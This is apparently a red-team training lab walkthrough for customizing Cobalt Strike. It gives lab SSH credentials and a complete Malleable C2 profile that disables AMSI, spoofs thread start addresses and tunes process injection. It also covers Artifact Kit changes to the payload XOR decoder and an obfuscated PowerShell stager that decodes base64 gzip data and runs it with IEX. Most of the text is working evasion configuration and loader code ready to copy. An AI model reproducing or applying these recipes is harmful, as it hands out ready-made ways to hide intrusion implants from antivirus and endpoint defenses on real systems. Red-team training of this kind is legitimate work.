# Malleable C2

1.  Click the Terminal icon on the Windows taskbar.

![terminal-icon.png](https://labondemand.blob.core.windows.net/content/lab216653/instructions347658/terminal-icon.png)

2.  SSH into the team server VM.
    
    1. ssh attacker@10.0.0.5
    2. The password is Passw0rd!.
3.  Move into the profiles directory.
    
    1. cd /opt/cobaltstrike/profiles
4.  Open _default.profile_ in a text editor (e.g. vim or nano).
    
5.  Add the following stage block:
    
    
    ```c
    stage {     set userwx "false";     set cleanup "true";     set copy_pe_header "false";     set module_x64 "Hydrogen.dll";      transform-x64 {         strrep "beacon.x64.dll" "bacon.x64.dll";         strrep "%02d/%02d/%02d" "%02d/%02d/%04d";         strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";         strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";         strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";     } }
    ```
    
6.  Add the following post-ex block:
    
    
    ```c
    post-ex {     set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";     set cleanup "true";     set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";     set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";     set amsi_disable "true";      transform-x64 {         strrep "This program cannot be run in DOS mode." "This is totally not a PE.";         strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";         strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";         strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";         strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";     } }
    ```
    
7.  Add the following process-inject block:
    
    
    ```c
    process-inject {     set allocator "VirtualAllocEx";     set bof_allocator "VirtualAlloc";     set bof_reuse_memory "true";     set min_alloc "8192";     set startrwx "false";     set userwx "false";      execute {         CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";         NtQueueApcThread-s;         NtQueueApcThread;         SetThreadContext;     } }
    ```
    
8.  Save the changes.
    
9.  Restart the team server.
    
    1. sudo /usr/bin/docker restart cobalt
10.  Check the container logs to ensure there are no profile errors.
    
    1. sudo /usr/bin/docker logs cobalt
11.  Verify that the server has loaded with the new profile.
    
    1. Launch Cobalt Strike and connect to the Team Server.
    2. Go to **Cobalt Strike > Malleable C2 Profile**.
    
    > The new _stage_, _post-ex_, and _process-inject_ blocks should be present.
    
```
set max_size "1500000";

stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}

post-ex {
    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}

process-inject {
    set allocator "VirtualAllocEx";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "8192";
    set startrwx "false";
    set userwx "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```
# Artifact Kit

1.  Launch Visual Studio Code from the Windows taskbar.

![vscode.png](https://labondemand.blob.core.windows.net/content/lab216653/instructions347658/vscode.png)

2.  Go to **File > Open Folder** and select _C:\Tools\cobaltstrike\arsenal-kit\kits\artifact_.
    
3.  Expand _src-common_ and open _patch.c_.
    
4.  Scroll to line ~45 and modify the _for_ loop. This is for the svc exe payloads.
    
    ```c
    x = length; while ( x-- ) {   * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ]; }
    ```
    
2.  Scroll to line ~116 and modify the other _for_ loop. This is for the normal exe payloads.
    
    ```c
    int x = length; while ( x-- ) {   * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ]; }
    ```
    
3.  Save the changes (**File > Save**) and close the folder (**File > Close Folder**).
    
4.  On the Windows taskbar, right-click on the Terminal icon and launch Ubuntu WSL.
    

![wsl.png](https://labondemand.blob.core.windows.net/content/lab216653/instructions347658/wsl.png)

3.  Change the working directory.
    
    1. cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
4.  Run **build.sh** to build the new artifacts.
    
    TerminalTypeCopy
    
    `./build.sh mailslot VirtualAlloc 382437 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts`
    
5.  Load the Aggressor Script in the Cobalt Strike client.
    
    1. Open the Cobalt Strike client.
    2. Go to **Cobalt Strike > Script Manager**.
    3. Click **Load**.
    4. Navigate to _C:\Tools\cobaltstrike\custom-artifacts\mailslot_ and select _artifact.cna_.

# Resource Kit

1.  If not already open from the previous task, launch Ubuntu WSL from the Windows Terminal.
    
2.  Change the working directory.
    
    1. cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
3.  Run **build.sh** to copy the resource templates.
    
    1. ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
4.  If not already open from the previous task, launch Visual Studio Code.
    
5.  Go to **File > Open Folder** and select _C:\Tools\cobaltstrike\custom-resources_.
    
6.  Select **template.x64.ps1**.
    
7.  Scroll to line 5 and replace `.Equals('System.dll')` with `.Equals('Sys'+'tem.dll')`.
    
8.  Scroll to line 32 and replace it with these two lines:
```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

1.  Save the changes (**File > Save**).
    
2.  Select **compress.ps1**.
    
3.  Use Invoke-Obfuscation to create a unique obfuscated version, or try the following:
```powershell
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```
    
13.  Save the changes (**File > Save**).
    
14.  Open the Cobalt Strike client and load **resources.cna** from _C:\Tools\cobaltstrike\custom-resources_.

# Listeners

smb
```
TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```